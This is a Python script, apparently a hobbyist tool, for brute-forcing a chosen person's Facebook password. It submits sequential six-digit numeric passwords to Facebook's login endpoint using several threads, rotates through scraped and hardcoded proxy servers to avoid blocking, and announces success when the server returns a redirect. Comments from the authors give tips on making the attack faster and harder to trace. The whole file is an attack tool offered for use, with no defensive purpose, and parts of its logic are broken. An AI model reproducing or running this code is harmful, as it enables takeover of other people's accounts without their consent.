import requests,re
import sys, os, time
import traceback, itertools
from bs4 import BeautifulSoup
from lxml.html import fromstring
from fake_useragent import UserAgent
from concurrent.futures import ThreadPoolExecutor, wait
import traceback

USER_AGENT = UserAgent();

ELITE_PROXY1 = "216.137.184.253:80";
ELITE_PROXY2 = "139.255.88.52:3128";
ELITE_PROXY3 = "146.196.123.211:9812";
ELITE_PROXY4 = "143.198.182.218:80";
ELITE_PROXY5 = "192.140.42.81:47277";

IN_URL = "https://facebook.com/";
POST_URL = "https://www.facebook.com/login.php"
CURRENT_PATH = os.path.dirname(os.path.abspath(__file__))+"/"
MIN_PASSWORD_LENGTH = 6;
# Better off using sessions when targeting a single
# website. --SYS10
session = requests.Session(); 

INVALID_PROXY = False;

CURRENT_PASSWORD = None;
USED_PASSWORD = None;
CURRENT_WORKERS = [];
EXECUTOR = ThreadPoolExecutor(max_workers=2)

IS_CRACKED = None;

def GET_PROXIES():
    proxies_url = 'https://free-proxy-list.net'; #'https://premiumproxy.net/elite-proxy-list';
    response = requests.get(proxies_url);#, verify=False);
    parser = fromstring(response.text);
    proxies = set();
	
    proxies.add(ELITE_PROXY1);
    proxies.add(ELITE_PROXY2);
    proxies.add(ELITE_PROXY3);
    proxies.add(ELITE_PROXY4);
    proxies.add(ELITE_PROXY5);
	
    for i in parser.xpath('//tbody/tr')[:10]:
        if i.xpath('.//td[7][contains(text(),"yes")]'):
            proxy = ":".join([i.xpath('.//td[1]/text()')[0], i.xpath('.//td[2]/text()')[0]]);
            proxies.add(proxy);			
    return proxies;

def PASSWORD_TEST(mail, password, proxy, my_timeout,trust_bool): 
    try:
        r = session.get(POST_URL, allow_redirects=False);#, proxies=proxy, verify=trust_bool, timeout=my_timeout);
        soup = BeautifulSoup(r.text, "html.parser")
        inputs = soup.find('form', id='login_form').findAll('input', {'type': ['hidden', 'submit']})
        post_data = {input.get('name'): input.get('value')  for input in inputs}
        post_data['email'] = mail
        post_data['pass'] = password;#"000010";
        scripts = soup.findAll('script')
        scripts_string = '/n/'.join([script.text for script in scripts])
        datr_search = re.search('\["_js_datr","([^"]*)"', scripts_string, re.DOTALL)
        user_agent = {'User-Agent':str(USER_AGENT.chrome)}
        # print(user_agent);
        if datr_search:
            datr = datr_search.group(1)
            cookies = {'_js_datr' : datr}
        else:
            return False
        login = session.post(POST_URL, data=post_data, cookies=cookies, allow_redirects=False);#, proxies=proxy, verify=trust_bool); #,headers=user_agent
        print("LOGINS STATUS_CODES: ", login.status_code, " ]");
        print("USER AGENT:", user_agent);
        #print(login.content);
        if login.status_code == 302:
            print("PASSWORD CRACKED");
            global IS_CRACKED;
            IS_CRACKED = True;
    except Exception:
        #traceback.print_exc();
        print("Skipping. Connection error");
        global INVALID_PROXY;
        INVALID_PROXY = True;
        return None;
		
class WORKER:
    #def currently_used(INT, PASSWORD):
    def Work(self, ARG):
        myself = EXECUTOR.submit(self, ARG[0], ARG[1], ARG[2], ARG[3], ARG[4]);
        CURRENT_WORKERS.append(myself);
    def __init__(self, func, ARG):
        self.ARG = ARG;

def WORK_STATION(number_of_worker, JOB, arg, INT):
    INT = INT;
    #NEW_WORKER = WORKER(JOB, arg);
    #number_of_worker-=1;
    for i in range(number_of_worker):
        print("Trying password [", INT, "]: ", arg[1]);
        USED_PASSWORD = arg[1];
        if USED_PASSWORD == arg[1]:
            INT+=1;
            arg[1] = str(INT).zfill(MIN_PASSWORD_LENGTH);
        NEW_WORKER = WORKER.Work(JOB, arg);
    EXECUTOR.shutdown(wait=True);
    return INT;
# combine this with multithreading/multiprocessing
# to make this piece of code reliable and fast.
#                                         --TheRipper

# You can use free proxy servers online, they're 
# risky and slow or unreliable but it's worth a shot.
#                                         --SYS12

url = 'https://httpbin.org/ip';
		
if __name__ == "__main__":
    PROXIES_LIST = GET_PROXIES();
    PROXY_POOL = itertools.cycle(PROXIES_LIST.copy());
    email = input('Enter EMAIL/ID to target: ').strip();
###############
    timeout = int(input('Enter the timeout request if the proxy is taking too long: ').strip());
    is_trustSSL = input('Do you want to assign verify var to request if proxy is taking to long? (True/False): ').strip();
    if is_trustSSL == "True": 
        is_trustSSL = True
    else: 
        is_trustSSL = False;
###############
    WORKERS_ASSIGNED = int(input('Enter how many workers do you want to assign to make the password cracking faster (by default use 4):'));
    EXECUTOR = ThreadPoolExecutor(max_workers=WORKERS_ASSIGNED);
    int = 000000;
    while True:
        int+=1;
        PROXY = next(PROXY_POOL);
        PROXY_ASSIGNED = {"http": PROXY, "https": PROXY};
        PROXIES_LIST.remove(PROXY)
        PASSWORD = str(int).zfill(MIN_PASSWORD_LENGTH);
        print("using proxy: [", PROXY, "]");
        #print("Trying password [", int, "]: ", PASSWORD);
        #IS_CRACKED = PASSWORD_TEST(email, PASSWORD, PROXY_ASSIGNED, timeout, is_trustSSL);
        CURRENT_PASSWORD = int;
		###
        if IS_CRACKED == True:
            print("TARGET PASSWORD PWNED. FINISHING....");
            break;
		###
        new_int = WORK_STATION(WORKERS_ASSIGNED, PASSWORD_TEST, [email, PASSWORD, PROXY_ASSIGNED, timeout, is_trustSSL], int);
        EXECUTOR = ThreadPoolExecutor(max_workers=WORKERS_ASSIGNED) # <-- assign again.
        if INVALID_PROXY == True:
            print("RETRYING THE PASSWORD: ",CURRENT_PASSWORD);
            int=CURRENT_PASSWORD-1; #-- RESTART
            INVALID_PROXY = False;
        else:
            int = new_int;
        #check if PROXIES_LIST is empty:
        if not PROXIES_LIST:
            print("PROXY_LIST empty: RECHARGING");
            PROXIES_LIST = GET_PROXIES();
            PROXY_POOL = itertools.cycle(PROXIES_LIST.copy());